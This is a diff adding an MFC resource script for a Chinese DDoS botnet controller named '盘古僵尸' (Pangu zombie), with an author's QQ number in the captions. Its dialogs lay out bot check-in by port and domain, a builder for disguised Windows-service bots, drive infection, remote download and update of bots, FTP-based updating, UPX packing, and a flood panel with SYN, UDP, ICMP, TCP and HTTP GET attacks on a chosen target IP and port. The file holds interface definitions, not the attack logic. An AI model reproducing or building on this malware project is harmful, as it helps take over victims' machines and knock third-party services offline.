@@ -1,0 +1,323 @@
+//Microsoft Developer Studio generated resource script.
+//
+#include "resource.h"
+
+#define APSTUDIO_READONLY_SYMBOLS
+/////////////////////////////////////////////////////////////////////////////
+//
+// Generated from the TEXTINCLUDE 2 resource.
+//
+#include "afxres.h"
+
+/////////////////////////////////////////////////////////////////////////////
+#undef APSTUDIO_READONLY_SYMBOLS
+
+/////////////////////////////////////////////////////////////////////////////
+// Chinese (P.R.C.) resources
+
+#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_CHS)
+#ifdef _WIN32
+LANGUAGE LANG_CHINESE, SUBLANG_CHINESE_SIMPLIFIED
+#pragma code_page(936)
+#endif //_WIN32
+
+#ifdef APSTUDIO_INVOKED
+/////////////////////////////////////////////////////////////////////////////
+//
+// TEXTINCLUDE
+//
+
+1 TEXTINCLUDE DISCARDABLE 
+BEGIN
+    "resource.h\0"
+END
+
+2 TEXTINCLUDE DISCARDABLE 
+BEGIN
+    "#include ""afxres.h""\r\n"
+    "\0"
+END
+
+3 TEXTINCLUDE DISCARDABLE 
+BEGIN
+    "#define _AFX_NO_SPLITTER_RESOURCES\r\n"
+    "#define _AFX_NO_OLE_RESOURCES\r\n"
+    "#define _AFX_NO_TRACKER_RESOURCES\r\n"
+    "#define _AFX_NO_PROPERTY_RESOURCES\r\n"
+    "\r\n"
+    "#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_CHS)\r\n"
+    "#ifdef _WIN32\r\n"
+    "LANGUAGE 4, 2\r\n"
+    "#pragma code_page(936)\r\n"
+    "#endif //_WIN32\r\n"
+    "#include ""res\\盘古.rc2""  // non-Microsoft Visual C++ edited resources\r\n"
+    "#include ""l.chs\\afxres.rc""          // Standard components\r\n"
+    "#endif\r\n"
+    "\0"
+END
+
+#endif    // APSTUDIO_INVOKED
+
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// Icon
+//
+
+// Icon with lowest ID value placed first to ensure application icon
+// remains consistent on all systems.
+IDR_MAINFRAME           ICON    DISCARDABLE     "res\\盘古.ico"
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// Dialog
+//
+
+IDD_MY_DIALOG DIALOGEX 0, 0, 515, 394
+STYLE DS_MODALFRAME | WS_MINIMIZEBOX | WS_POPUP | WS_VISIBLE | WS_CAPTION | 
+    WS_SYSMENU
+EXSTYLE WS_EX_APPWINDOW
+CAPTION "真正作者的QQ是 375858876 （唯一一个，其他的都是冒充的）"
+FONT 9, "宋体"
+BEGIN
+    EDITTEXT        IDC_EDIT_UPPORT,50,20,66,14,ES_AUTOHSCROLL
+    PUSHBUTTON      "开始监听",IDC_BUTTON_BEGINLIS,129,19,45,15
+    EDITTEXT        IDC_EDIT_DOMAIN,50,39,125,14,ES_AUTOHSCROLL
+    PUSHBUTTON      "生成服务端",IDC_BUTTON_MAKESERVER,129,113,45,15
+    EDITTEXT        IDC_EDIT_TGTIP,50,158,125,14,ES_AUTOHSCROLL
+    EDITTEXT        IDC_EDIT_TGTPORT,50,178,33,14,ES_AUTOHSCROLL
+    PUSHBUTTON      "开始",IDC_BUTTON_FLOOD,83,254,45,15
+    PUSHBUTTON      "停止",IDC_BUTTON_STOP,133,254,45,15
+    EDITTEXT        IDC_EDIT_DOWNLOAD,14,319,161,14,ES_AUTOHSCROLL
+    PUSHBUTTON      "远程下载",IDC_BUTTON_DOWNLOAD,129,337,45,15
+    PUSHBUTTON      "更新服务端",IDC_BUTTON_UPDATEDATA,79,337,45,15
+    CONTROL         "List1",IDC_LIST1,"SysListView32",LVS_REPORT | 
+                    LVS_AUTOARRANGE | WS_BORDER | WS_TABSTOP,199,7,309,380
+    GROUPBOX        "自动上线",IDC_STATIC,7,7,180,130
+    LTEXT           "监听端口",IDC_STATIC,14,23,33,8
+    LTEXT           "域名上线",IDC_STATIC,14,42,33,8
+    GROUPBOX        "攻击设置",IDC_STATIC,7,144,180,136
+    LTEXT           "攻击目标",IDC_STATIC,14,162,33,8
+    LTEXT           "攻击端口",IDC_STATIC,14,182,33,8
+    GROUPBOX        "其他附加功能",IDC_STATIC,7,287,180,70
+    PUSHBUTTON      "卸载",IDC_BUTTON_REMOVE,29,337,45,15
+    LTEXT           "准备就绪",IDC_SHOW,7,379,179,8
+    LTEXT           "服务名",IDC_STATIC,14,61,25,8
+    EDITTEXT        IDC_EDIT_SVCNAME,50,58,125,14,ES_AUTOHSCROLL
+    EDITTEXT        IDC_EDIT_SVCDISP,50,77,125,14,ES_AUTOHSCROLL
+    EDITTEXT        IDC_EDIT_SVCDESC,50,96,125,14,ES_AUTOHSCROLL
+    LTEXT           "显示名",IDC_STATIC,14,80,25,8
+    LTEXT           "服务描述",IDC_STATIC,14,99,33,8
+    PUSHBUTTON      "帮助",IDC_BUTTON_HELP,79,362,45,15
+    LTEXT           "攻击超时",IDC_STATIC,87,180,33,8
+    EDITTEXT        IDC_EDIT_TIMEOUT,125,178,33,14,ES_AUTOHSCROLL
+    LTEXT           "分钟",IDC_STATIC,159,180,17,8
+    CONTROL         "SYN",IDC_CHECK_SYN,"Button",BS_AUTOCHECKBOX | 
+                    WS_TABSTOP,50,200,28,10
+    CONTROL         "UDP",IDC_CHECK_UDP,"Button",BS_AUTOCHECKBOX | 
+                    WS_TABSTOP,83,200,28,10
+    CONTROL         "ICMP",IDC_CHECK_ICMP,"Button",BS_AUTOCHECKBOX | 
+                    WS_TABSTOP,147,200,29,10
+    PUSHBUTTON      "刷新主机",IDC_BUTTON_REFLASH,129,362,45,15
+    LTEXT           "协议选择",IDC_STATIC,14,200,33,8
+    LTEXT           "上线主机",IDC_STATIC,7,366,33,8
+    LTEXT           "0",IDC_UPHOST,44,366,20,8
+    CONTROL         "全选",IDC_CHECK_ALLSEL,"Button",BS_AUTOCHECKBOX | 
+                    WS_TABSTOP,50,256,32,10
+    PUSHBUTTON      "测试上线",IDC_BUTTON_TEST,79,113,45,15
+    PUSHBUTTON      "D",IDCANCEL,502,381,6,6,NOT WS_VISIBLE
+    CONTROL         "TCP并发连接(私服攻击专用)",IDC_CHECK_TCPBREAK,"Button",
+                    BS_AUTOCHECKBOX | WS_TABSTOP,50,210,116,10
+    CONTROL         "2k&&xp(SYN)",IDC_CHECK_W2000,"Button",BS_AUTOCHECKBOX | 
+                    WS_TABSTOP,50,238,53,10
+    CONTROL         "sp2&&2003(unSYN)",IDC_CHECK_SP2,"Button",
+                    BS_AUTOCHECKBOX | WS_TABSTOP,105,238,76,10
+    LTEXT           "选择主机",IDC_STATIC,13,240,33,8
+    LTEXT           "搜索IP",IDC_STATIC,13,303,25,8
+    EDITTEXT        IDC_EDIT_FINDIP,50,301,103,14,ES_AUTOHSCROLL
+    PUSHBUTTON      "搜",IDC_BUTTON_FINDIP,157,301,18,14
+    CONTROL         "GET攻击",IDC_CHECK_GET,"Button",BS_AUTOCHECKBOX | 
+                    WS_TABSTOP,50,222,44,10
+    EDITTEXT        IDC_EDIT_GETOBJ,96,222,80,12,ES_AUTOHSCROLL
+    CONTROL         "感染驱动器",IDC_CHECK_COVER,"Button",BS_AUTOCHECKBOX | 
+                    WS_TABSTOP,14,115,52,10
+    CONTROL         "TCP",IDC_CHECK_TCP,"Button",BS_AUTOCHECKBOX | 
+                    WS_TABSTOP,116,200,26,10
+END
+
+IDD_DIALOG_HELP DIALOG DISCARDABLE  0, 0, 333, 283
+STYLE DS_MODALFRAME | WS_POPUP | WS_CAPTION | WS_SYSMENU
+CAPTION "真正作者的QQ是 375858876 （唯一一个，其他的都是冒充的）"
+FONT 10, "宋体"
+BEGIN
+    CONTROL         "",IDC_EXPLORER1,"{8856F961-340A-11D0-A96B-00C04FD705A2}",
+                    WS_TABSTOP,7,7,319,269
+END
+
+IDD_DIALOG_FTP DIALOG DISCARDABLE  0, 0, 203, 129
+STYLE DS_MODALFRAME | WS_POPUP | WS_CAPTION | WS_SYSMENU
+CAPTION "FTP更新"
+FONT 10, "宋体"
+BEGIN
+    DEFPUSHBUTTON   "更新FTP",IDOK,144,105,52,17
+    LTEXT           "FTP服务器",IDC_STATIC,7,7,35,8
+    EDITTEXT        IDC_EDIT_FTPSERVER,45,7,148,12,ES_AUTOHSCROLL
+    LTEXT           "用户名",IDC_STATIC,7,33,23,8
+    LTEXT           "密码",IDC_STATIC,109,33,16,8
+    LTEXT           "IP文件",IDC_STATIC,7,59,24,8
+    LTEXT           "FTP端口",IDC_STATIC,109,58,28,8
+    LTEXT           "上线IP",IDC_STATIC,7,85,24,8
+    EDITTEXT        IDC_EDIT_USER,45,30,51,14,ES_AUTOHSCROLL
+    EDITTEXT        IDC_EDIT_PWD,142,30,51,14,ES_AUTOHSCROLL
+    EDITTEXT        IDC_EDIT_IPFILE,45,55,51,14,ES_AUTOHSCROLL
+    EDITTEXT        IDC_EDIT_FTPPORT,142,55,51,14,ES_AUTOHSCROLL
+    EDITTEXT        IDC_EDIT_IP,45,80,151,14,ES_AUTOHSCROLL
+END
+
+
+#ifndef _MAC
+/////////////////////////////////////////////////////////////////////////////
+//
+// Version
+//
+
+VS_VERSION_INFO VERSIONINFO
+ FILEVERSION 1,0,0,1
+ PRODUCTVERSION 1,0,0,1
+ FILEFLAGSMASK 0x3fL
+#ifdef _DEBUG
+ FILEFLAGS 0x1L
+#else
+ FILEFLAGS 0x0L
+#endif
+ FILEOS 0x4L
+ FILETYPE 0x1L
+ FILESUBTYPE 0x0L
+BEGIN
+    BLOCK "StringFileInfo"
+    BEGIN
+        BLOCK "080404b0"
+        BEGIN
+            VALUE "Comments", "\0"
+            VALUE "CompanyName", "\0"
+            VALUE "FileDescription", "盘古僵尸\0"
+            VALUE "FileVersion", "1, 0, 0, 1\0"
+            VALUE "InternalName", "盘古\0"
+            VALUE "LegalCopyright", "版权所有 (C) 2006\0"
+            VALUE "LegalTrademarks", "\0"
+            VALUE "OriginalFilename", "盘古.EXE\0"
+            VALUE "PrivateBuild", "\0"
+            VALUE "ProductName", "盘古 应用程序\0"
+            VALUE "ProductVersion", "1, 0, 0, 1\0"
+            VALUE "SpecialBuild", "\0"
+        END
+    END
+    BLOCK "VarFileInfo"
+    BEGIN
+        VALUE "Translation", 0x804, 1200
+    END
+END
+
+#endif    // !_MAC
+
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// DESIGNINFO
+//
+
+#ifdef APSTUDIO_INVOKED
+GUIDELINES DESIGNINFO DISCARDABLE 
+BEGIN
+    IDD_MY_DIALOG, DIALOG
+    BEGIN
+        LEFTMARGIN, 7
+        RIGHTMARGIN, 508
+        TOPMARGIN, 7
+        BOTTOMMARGIN, 387
+    END
+
+    IDD_DIALOG_HELP, DIALOG
+    BEGIN
+        LEFTMARGIN, 7
+        RIGHTMARGIN, 326
+        TOPMARGIN, 7
+        BOTTOMMARGIN, 276
+    END
+
+    IDD_DIALOG_FTP, DIALOG
+    BEGIN
+        LEFTMARGIN, 7
+        RIGHTMARGIN, 196
+        TOPMARGIN, 7
+        BOTTOMMARGIN, 122
+    END
+END
+#endif    // APSTUDIO_INVOKED
+
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// UPX
+//
+
+IDR_UPX1                UPX     DISCARDABLE     "res\\upx.exe"
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// Dialog Info
+//
+
+IDD_DIALOG_HELP DLGINIT
+BEGIN
+    IDC_EXPLORER1, 0x376, 160, 0
+0x0000, 0x0000, 0x004c, 0x0000, 0x39ac, 0x0000, 0x2d2a, 0x0000, 0x0000, 
+0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 
+0x0000, 0x0000, 0x004c, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0001, 
+0x0000, 0xd0e0, 0x0057, 0x3573, 0x11cf, 0x69ae, 0x0008, 0x2e2b, 0x6212, 
+0x0008, 0x0000, 0x0000, 0x0000, 0x004c, 0x0000, 0x1401, 0x0002, 0x0000, 
+0x0000, 0x00c0, 0x0000, 0x0000, 0x4600, 0x0080, 0x0000, 0x0000, 0x0000, 
+0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 
+0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0001, 0x0000, 
+0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 
+    0
+END
+
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// String Table
+//
+
+STRINGTABLE DISCARDABLE 
+BEGIN
+    IDP_SOCKETS_INIT_FAILED "Windows 通信端口初始化失败。"
+END
+
+#endif    // Chinese (P.R.C.) resources
+/////////////////////////////////////////////////////////////////////////////
+
+
+
+#ifndef APSTUDIO_INVOKED
+/////////////////////////////////////////////////////////////////////////////
+//
+// Generated from the TEXTINCLUDE 3 resource.
+//
+#define _AFX_NO_SPLITTER_RESOURCES
+#define _AFX_NO_OLE_RESOURCES
+#define _AFX_NO_TRACKER_RESOURCES
+#define _AFX_NO_PROPERTY_RESOURCES
+
+#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_CHS)
+#ifdef _WIN32
+LANGUAGE 4, 2
+#pragma code_page(936)
+#endif //_WIN32
+#include "res\盘古.rc2"  // non-Microsoft Visual C++ edited resources
+#include "l.chs\afxres.rc"          // Standard components
+#endif
+
+/////////////////////////////////////////////////////////////////////////////
+#endif    // not APSTUDIO_INVOKED
+
